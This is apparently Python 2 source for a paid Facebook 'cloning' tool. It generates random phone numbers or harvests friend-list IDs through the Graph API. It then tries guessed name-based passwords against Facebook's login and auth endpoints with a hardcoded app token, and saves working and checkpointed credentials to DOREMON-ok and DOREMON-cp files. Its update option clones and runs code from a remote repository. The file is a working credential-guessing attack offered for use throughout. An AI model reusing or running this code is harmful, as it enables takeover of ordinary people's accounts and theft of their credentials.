...
logo = """'
\033[1;92m
d888888b  .o88b. d888888b 
`~~88~~' d8P  Y8 `~~88~~' 
   88    8P         88    
   88    8b         88    
   88    Y8b  d8    88    
   YP     `Y88P'    YP    
'\x1b[1;91m'   Creater     :     NAZIR    
'\x1b[1;92m'   Github      :     \x1b[1;92mhttps://github.com/nazir765
'\x1b[1;93m'   FB ID       :     https://www.facebook.com/NaZerkhaN
'\x1b[1;94m'   TOOL TYPE   :     NAZIR COMMANDS 
'\x1b[1;96m'   WAP NUMBER  :     +9203025669420            
"""
dec="2"
server="2"
...
def main_apv():
    ...
    try:
        ...
        print ("         YOUR KEY : "+myid+khanxx)
        kok=open("/sdcard/.android.txt",'w')
        kok.write(myid+khanxx)
        kok.close()
        print ("")
    ...
    r1=requests.get("https://pastebin.com/japkcyms/new/main/khanxx.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
        ...
        print("           Hello Dear Ya Cammonds Paid Han Or")
        print ("           Ap Ke Subscription Nhi Ha Please Ap") 
        print ("           Admin Sa Baat Kran Thanks")
        print ("           Subscription Kelya Enter Press Kro")
        print ("           Or Whatsapp Par Contact Kro Thanks")
        print ("")
        print ("         YOUR KEY : "+key1)
        print ("")
        print ("           Ya Uper Wale Ap Ke KEY Ha")
        ...
        os.system("xdg-open https://wa.me/+03025669420")
...
def main_system():
    ...
    print ""
    print 39*'~'
    print "\x1b[1;97m[1]   Public Cloning      \x1b[1;93m(Login)"
    print "\x1b[1;96m[2]   Random Cloning     \x1b[1;93m (No Login)"
    print "\x1b[1;95m[3]   File Cloning       \x1b[1;92m (No Login)"
    print "\x1b[1;94m[4]   File Making Menu\x1b[1;94m    (Login)"
    print "\x1b[1;93m[5]   Check Subscription "
    print "\x1b[1;92m[6]   Update Tools"
    print "\x1b[1;91m[7]   For Any Help Massage WhatsApp"
    print 43*'~'
...
def main_input():
    ...
    if mx=='1':
        ...
        print ("\x1b[1;92m        Member In NAZIR Brand Paid Commands ")
        print ("\x1b[1;91m        ENJOY  KRO BHI LOGO ")
        time.sleep(3.5)
        main_system()
    elif mx=='6':
        os.system("rm -rf PAID")
        os.system("git clone https://github.com/Nazir765/Ict-paid4.git")
        
        os.system("cp -f PAID/PAID \\.")
        os.system("rm -rf Ict-paid4")
        os.system(" cd Ict-paid4")
        os.system(" python2 Ict-paid4.py")
        time.sleep(5)
...
def numcloning():
    ...
    print logo
    print ""
    print    "    \033[1;91m\n    [ India Random Number Cloning ]"
    
    print ""
    print ('\033[1;92m\n   [*] Enter First 4 Latter Of Any Network : ')
    print ("\033[1;93m\n     Example 9423  6247 8943 7423 ")
    print ""
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[NAZIR-CP] "+uid + " | " + pass1
                    cp=open('DOREMON random-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
...
def mineExt():
    ...
    print g+"[=] Extracting From NAZIR : "+my_line[:15]
    ...
    my_line = file.readline()
    count.append(my_line)
    print g+"[=] Extracting From DOREMON : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[NAZIR-OK] "+uid + " | " + pass1
                ok=open('DOREMON-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[NAZIR-OK] "+uid + " | " + pass2
                        ok=open('DOREMON-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[NAZIR-CP] "+uid + " | " + pass2
                            cp=open('DOREMON-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[NAZIR-OK] "+uid + " | " + pass3
                                ok=open('DOREMON-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[DOREMON-CP] "+uid + " | " + pass3
                                    cp=open('DOREMON-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[NAZIR-OK] "+uid + " | " + pass4
                                        ok=open('DOREMON-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[NAZIR-OK] "+uid + " | " + pass5
                                                ok=open('DOREMON-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[NAZIR-Ok] "+uid + " | " + pass5
                                                    cp=open('DOREMON-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
...
def xokp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[DOREMON-OK] "+uid + " | " + pass1
                ok=open('DOREMON-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;91m[DOREMON-CP] "+uid + " | " + pass1
                    cp=open('DOREMON-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;92m[NAZIR-CP] "+uid + " | " + pass2
                            cp=open('DOREMON-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;92m[NAZIR-CP] "+uid + " | " + pass3
                                    cp=open('DOREMON-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[NAZIR-CP] "+uid + " | " + pass4
                                            cp=open('DOREMON-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[NAZIR-CP] "+uid + " | " + pass5
                                                    cp=open('DOREMON-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;92m[NAZIR-CP] "+uid + " | " + pass1
                    cp=open('DOREMON-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[NAZIR-CP] "+uid + " | " + pass3
                                    cp=open('DOREMON-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[DOREMON-OK] "+uid + " | " + pass2
                        ok=open('DOREMON-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[DOREMON-CP] "+uid + " | " + pass2
                            cp=open('DOREMON-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                            ...
                            b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[DOREMON-OK] "+uid + " | " + pass3
                                ok=open('DOREMON-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    ...
                                    b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[DOREMON-OK] "+uid + " | " + pass4
                                        ok=open('DOREMON-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[DOREMON-CP] "+uid + " | " + pass4
                                            cp=open('DOREMON-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                            ...
                                            b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[DOREMON-OK] "+uid + " | " + pass5
                                                ok=open('DOREMON-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[DOREMON-CP] "+uid + " | " + pass5
                                                    cp=open('DOREMON-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
...
def n_p_pass():
    ...
    def main(arg):
        ...
        try:
            ...
            pass1 = name
            data = requests.get('https://m.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
            q = json.loads(data)
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    ...
                    pass2= first+ps1
                    data = requests.get('https://m.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                    q = json.loads(data)
                    if "access_token" in q:
                        print "\x1b[1;92m[DOREMON-OK] "+uid + " | " + pass2
                        ok=open('DOREMON-ok.txt', 'a')
                        ...
                        if "www.facebook.com" in q ["error_msg"]:
                            ...
                            pass3=  first+ps2
                            data = requests.get('https://m.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                            q = json.loads(data)
                            if "access_token" in q:
                                print "\x1b[1;92m[DOREMON-OK] "+uid + " | " + pass3
                                ok=open('DOREMON-ok.txt', 'a')
                                ...
                                if "www.facebook.com" in q ["error_msg"]:
                                    ...
                                    pass4= first+ps3
                                    data = requests.get('https://m.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                    q = json.loads(data)
                                    if "access_token" in q:
                                        print "\x1b[1;92m[DOREMON-OK] "+uid + " | " + pass4
                                        ok=open('DOREMON-ok.txt', 'a')
                                        ...
                                        if "www.facebook.com" in q ["error_msg"]:
                                            ...
                                            pass5= last+ps4
                                            data = requests.get('https://m.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                            q = json.loads(data)
                                            if "access_token" in q:
                                                print "\x1b[1;92m[DOREMON-OK] "+uid + " | " + pass5
                                                ok=open('DOREMON-ok.txt', 'a')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;97m[DOREMON-CP] "+uid + " | " + pass1
                    cp=open('DOREMON-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;97m[DOREMON-CP] "+uid + " | " + pass2
                            cp=open('DOREMON-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[DOREMON-CP] "+uid + " | " + pass3
                                    cp=open('DOREMON-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+"Ali12345"
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://m.facebook.com')
                                    b = rana.post('https://m.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;97m[DOREMON-CP] "+uid + " | " + pass4
                                            cp=open('DOREMON-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;97m[DOREMON-CP] "+uid + " | " + pass5
                                                    cp=open('DOREMON-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[DOREMON-OK] "+uid + " | " + pass6
                                                        ok=open('DOREMON-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[DOREMON-CP] "+uid + " | " + pass6
                                                            cp=open('DOREMON-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
